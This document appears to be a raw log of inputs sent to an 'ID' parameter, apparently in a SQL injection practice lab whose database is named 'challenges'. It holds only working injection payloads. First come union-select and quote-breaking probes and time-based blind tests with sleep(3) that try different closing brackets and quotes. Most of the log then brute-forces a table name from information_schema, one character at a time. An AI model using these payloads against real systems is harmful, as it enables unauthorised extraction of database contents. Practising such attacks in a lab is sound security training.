ID:1
ID:10
ID:-1' union select 1,2,3 -- 
ID:1'
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1' and if(left(user(),1)='a',0,sleep(3)) #
ID:1' and if(left(user(),1)='a',0,sleep(3)) #
ID:1
ID:1" and if(left(user(),1)='a',0,sleep(3)) #
ID:1" and if(left(user(),1)='a',0,sleep(3)) #
ID:1") and if(left(user(),1)='a',0,sleep(3)) #
ID:1') and if(left(user(),1)='a',0,sleep(3)) #
ID:1 and if(left(user(),1)='a',0,sleep(3)) #
ID:1') and if(left(user(),1)='a',0,sleep(3)) #
ID:1')) and if(left(user(),1)='a',0,sleep(3)) #
ID:1) and if(left(user(),1)='a',0,sleep(3)) #
ID:1") and if(left(user(),1)='a',0,sleep(3)) #
ID:1")) and if(left(user(),1)='a',0,sleep(3)) #
ID:1")) and if(left(user(),1)='a',0,sleep(3)) #
ID:1")) and if(left(user(),1)='a',0,sleep(3)) #
ID:1")) and if(left(user(),1)='a',0,sleep(3)) #
ID:1")) and if(left(user(),1)='a',0,sleep(3)) #
ID:1")) and if(left(user(),1)='a',0,sleep(3)) #
ID:1"") and if(left(user(),1)='a',0,sleep(3)) #
ID:1"" and if(left(user(),1)='a',0,sleep(3)) #
ID:1'') and if(left(user(),1)='a',0,sleep(3)) #
ID:1)) and if(left(user(),1)='a',0,sleep(3)) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassnI') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassnJ') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassnK') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassnL') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassnM') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassnN') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassnO') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassnP') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassnQ') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassnR') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassnS') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassnT') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassnU') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassnV') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassnW') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassnX') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassnY') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassnZ') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassn0') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassn1') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassn2') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassn3') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassn4') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassn5') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassn6') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassn7') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassn8') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassn9') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassn!') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassn"') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassn$') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassn%') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassn&') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassn'') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassn(') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassn)') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassn*') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassn+') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassn,') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassn-') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassn.') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassn/') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassn:') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassn;') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassn<') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassn=') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassn>') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassn?') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassn@') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassn[') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassn\') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassn]') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassn^') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassn_') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassn`') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassn{') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassn|') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassn}') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = '1qerhfassn~') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'a') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'b') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'c') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'd') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'e') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'f') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'g') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'h') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'i') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'j') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'k') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'l') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'm') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'n') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'o') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'p') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'q') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'r') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 's') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 't') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'u') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'v') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'w') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'x') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'y') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'z') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'A') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'B') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'C') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'D') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'E') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'F') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'G') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'H') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'I') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'J') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'K') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'L') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'M') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'N') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'O') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'P') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'Q') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'R') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'S') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'T') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'U') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'V') , sleep(3) , 0) #
